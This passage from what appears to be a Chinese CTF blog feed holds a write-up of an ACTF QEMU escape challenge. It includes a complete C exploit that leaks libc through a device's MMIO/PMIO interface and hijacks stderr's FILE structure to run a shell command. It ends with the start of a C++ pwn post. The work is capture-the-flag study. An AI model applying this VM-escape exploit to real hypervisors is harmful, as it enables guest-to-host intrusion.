</span><br><span class="hljs-comment">// 04:0020│ r11 0x559cbeef0fc8 ◂— 0xc9b59388b0adbfbe                                                     </span><br><span class="hljs-comment">// 05:0028│     0x559cbeef0fd0 ◂— 0x8bb287b5efbeaf84                                                     </span><br><span class="hljs-comment">// 06:0030│     0x559cbeef0fd8 ◂— 0x95b4a2838496a4f8                                                    </span><br><span class="hljs-comment">// 07:0038│     0x559cbeef0fe0 ◂— 0xc6ca9ad88681c5b4     </span><br><br><span class="hljs-comment">// 0x7f0f875f94a0 ◂— 0x3525b76e0d25b76e</span><br><span class="hljs-comment">// 0x7f0f875f94a8 ◂— 0xb5a5278efde5674e</span><br><span class="hljs-comment">// 0x7f0f875f94b0 ◂— 0xb58517cead8517ce</span><br><span class="hljs-comment">// 0x7f0f875f94b8 ◂— 0x3505e72e7d4527ee</span><br><br><span class="hljs-comment">// something_i_know ^ x = flag 0x559cbeef0570</span><br><br>    set_value(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7a1299023d29ff68</span>);<br>    set_value(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x702edf5e423bb634</span>);<br>    set_value(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2653e2366369b36c</span>);<br>    set_value(<span class="hljs-number">0x18</span>,<span class="hljs-number">0xd9a33790b594ae73</span>);<br>    set_value(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xc9b59388b0adbfbe</span>);<br>    set_value(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x8bb287b5efbeaf84</span>);<br>    set_value(<span class="hljs-number">0x30</span>,<span class="hljs-number">0x95b4a2838496a4f8</span>);<br>    set_value(<span class="hljs-number">0x38</span>,<span class="hljs-number">0xc6ca9ad88681c5b4</span>);<br>    <br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>后来👴看了arr的wp，知道了这边才是核心(👴是不会说👴刚开始把后面的赋值当成核心在看的（bushi））</p><p><img src="/img/ACTF/9.png" alt="img"></p><p>👴动调了一会发现大概应该或许可能是一个有点麻烦的异或，反正👴出flag了不管了</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>👴一直搞不明白那个0xa31的地方是怎么变成1的</p><p>看了xtx师傅的wp发现pmio_write两次就行了，啊？</p><p>逆不明白，尊嘟逆不明白</p><p>后面就是mmio_write可以覆写0xa78低4位，造成任意地址读写</p><p>然后libc泄露因为只有低4位可改，找了半天也找不到，看了Esifiel师傅的官方wp才知道原来pandbg还有这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">pwndbg&gt; leakfind <span class="hljs-number">0x7fff60000000</span> --max_offset=<span class="hljs-number">0x1000</span> --page_name=libc<br>        <span class="hljs-number">0x7fff60000000</span>+<span class="hljs-number">0x8a0</span> —▸ <span class="hljs-number">0x7ffff0000030</span>+<span class="hljs-number">0x870</span> —▸ <span class="hljs-number">0x7ffff6819c80</span> /usr/lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span><br></code></pre></td></tr></table></figure><p>啊？啊？啊？</p><p>🤡</p><p>后面就是打_IO_FILE，在关机的时候把flag带出来，我这里用的是最顺手的house of apple链子</p><p>然后因为只有低四字节能覆盖，泄露libc大概有1&#x2F;2的概率offset超出四字节限制，回直接dump掉，调式的时候真给👴干🤮🌶️。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-comment">// #define PAGE_SHIFT 12</span><br><span class="hljs-comment">// #define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) // 4096</span><br><span class="hljs-comment">// #define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-comment">// #define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-comment">// #define PMIO_BASE 0x000000000000c000</span><br><span class="hljs-comment">// #define CSR(_x) ((_x) &lt;&lt; 3)</span><br><span class="hljs-comment">// #define CSR5_TS_SUSPENDED 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMIO_BASE 0XC040</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* mmio_mem;<br><span class="hljs-type">uint8_t</span> payload[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint32_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(PMIO_BASE + value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    outb(value,PMIO_BASE+addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_value</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    mmio_write(addr,value&amp;<span class="hljs-number">0xffffffff</span>);<br>    mmio_write(addr+<span class="hljs-number">4</span>,value&gt;&gt;<span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_payload</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> start_addr, <span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size / <span class="hljs-number">8</span>; ++i)&#123;<br>        mmio_write(<span class="hljs-number">0x40</span>, start_addr);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; ++j)&#123;<br>            pmio_write(j + <span class="hljs-number">0x10</span>, payload[i * <span class="hljs-number">8</span> + j]);<br>        &#125;<br>        start_addr += <span class="hljs-number">8</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> leak[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_SYNC|O_RDWR);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open mmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;get mmio_mem failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);<br><br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open pmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">// 00:0000│ rbx 0x56043c8e1fa8 ◂— 0xaba29ec2a98dd89a                                                     </span><br><span class="hljs-comment">// 01:0008│     0x56043c8e1fb0 ◂— 0xbbf1b4ab81b4a9d4                                                     </span><br><span class="hljs-comment">// 02:0010│     0x56043c8e1fb8 ◂— 0xfb92a48db386ffa8                                                     </span><br><span class="hljs-comment">// 03:0018│     0x56043c8e1fc0 ◂— 0xefb491b8afb4abd3                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x56043c8e1fc8 ◂— 0x80ef69f1cbd00397                                                    </span><br><span class="hljs-comment">// 05:0028│     0x56043c8e1fd0 ◂— 0xb2eb07859cda52d3                                                     </span><br><span class="hljs-comment">// 06:0030│     0x56043c8e1fd8 ◂— 0xec9e22f5a5a07fa3                                                 </span><br><span class="hljs-comment">// 07:0038│     0x56043c8e1fe0 ◂— 0x4b36df7b5b655a84 </span><br><br><span class="hljs-comment">// 00:0000│ rbx 0x559cbeef0fa8 ◂— 0x7a1299023d29ff68                                                     </span><br><span class="hljs-comment">// 01:0008│     0x559cbeef0fb0 ◂— 0x702edf5e423bb634                                                     </span><br><span class="hljs-comment">// 02:0010│     0x559cbeef0fb8 ◂— 0x2653e2366369b36c                                                     </span><br><span class="hljs-comment">// 03:0018│     0x559cbeef0fc0 ◂— 0xd9a33790b594ae73                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x559cbeef0fc8 ◂— 0xc9b59388b0adbfbe                                                     </span><br><span class="hljs-comment">// 05:0028│     0x559cbeef0fd0 ◂— 0x8bb287b5efbeaf84                                                     </span><br><span class="hljs-comment">// 06:0030│     0x559cbeef0fd8 ◂— 0x95b4a2838496a4f8                                                    </span><br><span class="hljs-comment">// 07:0038│     0x559cbeef0fe0 ◂— 0xc6ca9ad88681c5b4     </span><br><br><span class="hljs-comment">// 0x7f0f875f94a0 ◂— 0x3525b76e0d25b76e</span><br><span class="hljs-comment">// 0x7f0f875f94a8 ◂— 0xb5a5278efde5674e</span><br><span class="hljs-comment">// 0x7f0f875f94b0 ◂— 0xb58517cead8517ce</span><br><span class="hljs-comment">// 0x7f0f875f94b8 ◂— 0x3505e72e7d4527ee</span><br><br><span class="hljs-comment">// something_i_know ^ x = flag 0x559cbeef0570</span><br><br>    set_value(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7a1299023d29ff68</span>);<br>    set_value(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x702edf5e423bb634</span>);<br>    set_value(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2653e2366369b36c</span>);<br>    set_value(<span class="hljs-number">0x18</span>,<span class="hljs-number">0xd9a33790b594ae73</span>);<br>    set_value(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xc9b59388b0adbfbe</span>);<br>    set_value(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x8bb287b5efbeaf84</span>);<br>    set_value(<span class="hljs-number">0x30</span>,<span class="hljs-number">0x95b4a2838496a4f8</span>);<br>    set_value(<span class="hljs-number">0x38</span>,<span class="hljs-number">0xc6ca9ad88681c5b4</span>);<br>    <br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    pmio_write(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    pmio_write(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    leak[<span class="hljs-number">0</span>] = mmio_read(<span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">uint32_t</span> addr1 = <span class="hljs-number">0</span>;<br>    addr1 = (leak[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">24</span>) &lt;&lt; <span class="hljs-number">24</span>;<br><br>    mmio_write(<span class="hljs-number">0x40</span>,addr1 + <span class="hljs-number">0x8a0</span>);<br>    leak[<span class="hljs-number">0</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x10</span>);<br>    leak[<span class="hljs-number">1</span>] = pmio_read(<span class="hljs-number">4</span>+<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-type">uint64_t</span> addr2 = <span class="hljs-number">0</span>;<br>    addr2 = leak[<span class="hljs-number">1</span>] * <span class="hljs-number">0x100000000</span> + leak[<span class="hljs-number">0</span>];<br>    sleep(<span class="hljs-number">1</span>);<br>    mmio_write(<span class="hljs-number">0x40</span>,leak[<span class="hljs-number">0</span>]+<span class="hljs-number">0x8a0</span><span class="hljs-number">-0x30</span>);<br><br>    leak[<span class="hljs-number">0</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x10</span>);<br>    leak[<span class="hljs-number">1</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x14</span>);<br>    <br>    <span class="hljs-type">size_t</span> libc_address = <span class="hljs-number">0</span>;<br>    libc_address = (leak[<span class="hljs-number">1</span>]*<span class="hljs-number">0x100000000</span>) + leak[<span class="hljs-number">0</span>] - <span class="hljs-number">0x219c80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc_address is %lx&quot;</span>,libc_address);<br><br>    <span class="hljs-type">size_t</span> system_addr = <span class="hljs-number">0x50d70</span> + libc_address;<br>    <span class="hljs-type">size_t</span> stderr_addr = <span class="hljs-number">0x21a6a0</span> + libc_address;<br>    <span class="hljs-type">size_t</span> _IO_list_all = <span class="hljs-number">0x21a680</span> + libc_address;<br>    <span class="hljs-type">size_t</span> _IO_wfile_jumps = <span class="hljs-number">0x2160c0</span> + libc_address;<br><br>    <span class="hljs-built_in">memcpy</span>(payload, <span class="hljs-string">&quot;  cat flag &gt;&amp;2;&quot;</span>, <span class="hljs-number">0x10</span>);<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">20</span>] = addr2;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">27</span>] = _IO_wfile_jumps;<br>    send_payload(stderr_addr, <span class="hljs-number">0xe0</span>);<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">20</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = stderr_addr;<br>    send_payload(stderr_addr - <span class="hljs-number">0x20</span>, <span class="hljs-number">0x8</span>);<br>    <br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = addr2+<span class="hljs-number">0xe0</span>;<br>    send_payload(addr2+<span class="hljs-number">0xe0</span>, <span class="hljs-number">0x8</span>);<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = system_addr;<br>    send_payload(addr2+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x68</span>,<span class="hljs-number">8</span>);<br><br><br>    system(<span class="hljs-string">&quot;poweroff -f&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/10.png" alt="img"></p><p>终于出来啦，感觉比🐍出来还要舒服啊</p><p>其实感觉挺基础的一道qemu escape，但为什么要加个逆向来恶心我呢。</p><p>这是怎么绘事呢？</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dig into C++ pwn</title>
    <link href="/2023/10/20/C/"/>
    <url>/2023/10/20/C/</url>
    
    <content type="html"><![CDATA[<h1 id="learn-to-do-C-Pwn"><a href="#learn-to-do-C-Pwn" class="headerlink" title="learn to do C++ Pwn"></a>learn to do C++ Pwn</h1><h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>借用前华东百之👴的一句话：</p><p>c++pwn，就是艹c艹</p><h1 id="0x1-愉悦的折磨"><a href="#0x1-愉悦的折磨" class="headerlink" title="0x1:愉悦的折磨"></a>0x1:愉悦的折磨</h1><h2 id="N1-junior2023-顶级签到"><a href="#N1-junior2023-顶级签到" class="headerlink" title="N1 junior2023 顶级签到"></a>N1 junior2023 顶级签到</h2><p>当初笔者参加N1 junior，这题是看都看不懂，在学了两天C++基本语法后，笔者重新捡起了这题</p><p>题目给了源码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">(写完程序)</span><br><span class="hljs-comment">“你自己运行了吗？😏”</span><br><span class="hljs-comment">“跑了一下🤥”</span><br><span class="hljs-comment">“感觉怎么样？🧐”</span><br><span class="hljs-comment">“我去除了大部分的安全问题，但是我保留了一部分” “我觉得保留了一部分漏洞，才知道你做的是CTF题🤓”</span><br><span class="hljs-comment">“你是有意把它保留的吗🤨”</span><br><span class="hljs-comment">“是编写过程中，我留下了一部分😌”</span><br><span class="hljs-comment">“是故意的还是不小心😨”</span><br><span class="hljs-comment">“是故意的😋”</span><br><span class="hljs-comment">（打开源码）</span><br><span 